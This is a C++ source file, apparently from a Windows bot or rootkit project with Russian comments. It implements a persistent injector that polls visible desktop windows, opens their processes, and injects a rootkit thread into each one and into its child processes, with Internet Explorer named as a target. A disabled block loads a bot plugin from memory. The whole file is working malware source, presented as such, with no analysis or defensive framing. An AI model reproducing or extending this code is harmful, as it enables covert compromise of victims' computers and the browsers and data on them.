//---------------------------------------------------------------------------

#pragma hdrstop

#include <Windows.h>
#include <tlhelp32.h>

#include "AppInjector.h"
#include "BotCore.h"
#include "Inject.h"
#include "Utils.h"
#include "Installer.h"
#include "DLLLoader.h"
#include "ntdll.h"
#include "Rootkit.h"
#include "BotUtils.h"
//---------------------------------------------------------------------------


#include "BotDebug.h"

namespace INJECTORRDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define INJKDBG INJECTORRDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------

namespace INJECTOR
{
	typedef struct TInjector
	{
		bool      IsWin64;     // Признак того, что процесс работает в 64 битной вине
		TBotList* Injected;    // Список процессов, в которые был совершён инжект
		LPBYTE    NameBuf;     // Буфер получения имени ехе процесса
		DWORD     NameBufSize; // размер буфера получения имени ехе процесса

		TInjectFunction InjectFunction; // Указатель на внедряемую функцию
	} *PInjector;

	typedef struct TProcessInfo
	{
		DWORD    PID;
		BOOL     IsWOW64;
		wstring  ExeName;
	} *PProcessInfo;

	typedef struct TInjectItem
	{
		DWORD NameHash;
		DWORD PID;
	} *PInjectItem;

	DWORD WINAPI InjectorProc(LPVOID);
	BOOL CALLBACK WndEnumCallBak(HWND Wnd, LPARAM Param);
	bool GetProcessInfo(PInjector Injector, DWORD PID, TProcessInfo &Info);
	bool Inject(PInjector Injector, PProcessInfo Info);
	void InjectInChildProcesses(PInjector Injector, PProcessInfo Parent);
}


//------------------------------------------------------
//  StartInjector - Функция стартует процесс инжектора
//------------------------------------------------------
BOOL WINAPI StartInjector()
{
	INJKDBG("INJECTOR", "Стартуем инжектор");
	#ifdef AGENTFULLTEST
		return StartThread(INJECTOR::InjectorProc, NULL) != NULL;
	#else
		return MegaJump(INJECTOR::InjectorProc);
	#endif
}



//------------------------------------------------------
//  InjectorProc - Основная функция инжектора, которая
//                 постоянно мониторит запущенные процессы
//------------------------------------------------------
DWORD WINAPI INJECTOR::InjectorProc(LPVOID)
{
	// Алгоритм работы следующий:
	// Перебираем все кна рабочего стола и инжектимся
	// в поцесы владельцы
	BOT::Initialize();

	INJKDBG("INJECTOR", "Запущен процесс инжектра");

	TInjector Injector;
	Injector.IsWin64  = IsWIN64();
	Injector.Injected = new TBotList();
	Injector.NameBufSize = 1024;
	Injector.NameBuf = (LPBYTE)MemAlloc(Injector.NameBufSize);

	// Для старта определяем основную функцию руткита
	Injector.InjectFunction = RootkitThread;

	/*
	// Загружаем плагин
	INJKDBG("INJECTOR", "Загружаем bot.plug");
	for (int i = 0; i < 2; i++)
	{
		LPVOID Plug = NULL;
		LPVOID PlugHandle = NULL;
		if (LoadBotPlug(&Plug, NULL))
		{
			PlugHandle = MemoryLoadLibrary(Plug, false);
			Injector.InjectFunction = (TInjectFunction)MemoryGetProcAddress(PlugHandle, START_PROC_HASH);
			FreeBotPlug(Plug);
		}
		if (Injector.InjectFunction) break;




		// В случае ошибки получения адреса функции
		// принудительно обновляем плагин
		MemoryFreeLibrary(PlugHandle);
		UpdateBotPlug();
	}

	if (!Injector.InjectFunction) pExitProcess(0); */


    INJKDBG("INJECTOR", "Стартуем");

	while (!BOT::Terminated())
	{
		// Перебираем главные окна окна
		pEnumWindows(WndEnumCallBak, &Injector);
		pSleep(500);
	}

	// При завершении работы выходим из процесса
	pExitProcess(0);
	return 0;
}

//------------------------------------------------------
// GetProcessInfo - Функция полуает информацию о прцессе
//------------------------------------------------------
bool INJECTOR::GetProcessInfo(PInjector Injector, DWORD PID, TProcessInfo &Info)
{
	ClearStruct(Info);
	Info.PID = PID;
	// Открываем процесс
	CLIENT_ID ClientID;
	ClientID.UniqueProcess = (HANDLE)PID;
	ClientID.UniqueThread  = 0;

	OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) } ;

	HANDLE Process;
	if (pZwOpenProcess(&Process,  PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &ObjectAttributes, &ClientID) != STATUS_SUCCESS)
		return false;

	// Определяем кк запущен процесс
	pIsWow64Process(Process, &Info.IsWOW64);

	if (Injector->IsWin64 && !Info.IsWOW64)
		return false;

	// Получаем имя процесса
	PUNICODE_STRING Str = (PUNICODE_STRING)Injector->NameBuf;
	Str->Length = 0;
	Str->MaximumLength = Injector->NameBufSize - sizeof(UNICODE_STRING);
	Str->Buffer        = (PWSTR)(Injector->NameBuf + sizeof(UNICODE_STRING));
	ULONG Len = Str->MaximumLength;

	if(pZwQueryInformationProcess(Process, ProcessImageFileName, Str, Len, &Len) == STATUS_SUCCESS)
	{
		// Успешно получили имя процесса
		Info.ExeName = Str->Buffer;
	}


	// Закрываем процесс
	pZwClose(Process);
    return true;
}


//------------------------------------------------------
//  WndEnumCallBak - Функция обработки найденного окна
//------------------------------------------------------
BOOL CALLBACK INJECTOR::WndEnumCallBak(HWND Wnd, LPARAM Param)
{
	// Окно должно быть видимым и не иметь владельца
	if (pIsWindowVisible(Wnd) && !pGetWindow(Wnd, GW_OWNER))
	{
		// Получаем пид пресса которому принадлежит окно
		DWORD PID = 0;
		pGetWindowThreadProcessId(Wnd, &PID);
		if (PID)
		{
			PInjector Injector = (PInjector)Param;


			TProcessInfo Info;
			if (GetProcessInfo(Injector, PID, Info))
			{
				// Проверяем необходимость инжекта
				// Разрешаем инжект в 32 разрядной винде или в 32 разрядные процессы
				Inject(Injector, &Info);
			}

		}
    }

	return TRUE;
}


void INJECTOR::InjectInChildProcesses(PInjector Injector, PProcessInfo Parent)
{
	// Функция инжектится в дочерние процессы
	// и параллельно роверяем список обработанных процессов
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);
	HANDLE Snap = (HANDLE)pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0);
	if (Snap != INVALID_HANDLE_VALUE)
	{
		if (pProcess32First(Snap, &pe))
		{
			do
			{
				if (pe.th32ParentProcessID == Parent->PID)
				{
					TProcessInfo Info;
					if (GetProcessInfo(Injector, pe.th32ProcessID, Info))
						Inject(Injector, &Info);
				}

			} while( pProcess32Next(Snap, &pe ) );
		}
		pCloseHandle(Snap);
    }
 }


//------------------------------------------------------
// Inject - Функция осуществляет инжект в казанный процесс
//------------------------------------------------------
bool INJECTOR::Inject(PInjector Injector, PProcessInfo Info)
{
	DWORD Hash = Info->ExeName.Hash();
	// Проверяем не инжектились ли в данный процесс
	for (int i = 0; i < Injector->Injected->Count(); i++)
	{
		PInjectItem Item = (PInjectItem)Injector->Injected->GetItem(i);
		if (Item->PID == Info->PID && Item->NameHash == Hash)
		{
			// При повторном инжекте пробуем заинжектиться в дочерние процессы.
			// связано с тем, что некоторые программы создают один основной и
			// при следующем запуске создают его дочерние процессы.
			// В частности такое поведение замечено за Internet Explorer
			InjectInChildProcesses(Injector, Info);

			return false;
        }
	}

	if (!BOT::ProcessInfected(Info->PID))
	{
		#ifndef AGENTFULLTEST
			BOOL Injected = InjectIntoProcess2(Info->PID, Injector->InjectFunction);
			INJKDBG("INJECTOR", "Инжект: Result=%d App=%S", Injected, Info->ExeName.t_str());
		#else
			BOOL Injected = TRUE;
		#endif
    }

	// Сохраняем информацию
	PInjectItem Item = CreateStruct(TInjectItem);
	Item->PID = Info->PID;
	Item->NameHash = Hash;
	Injector->Injected->Add(Item);
	return true;
}
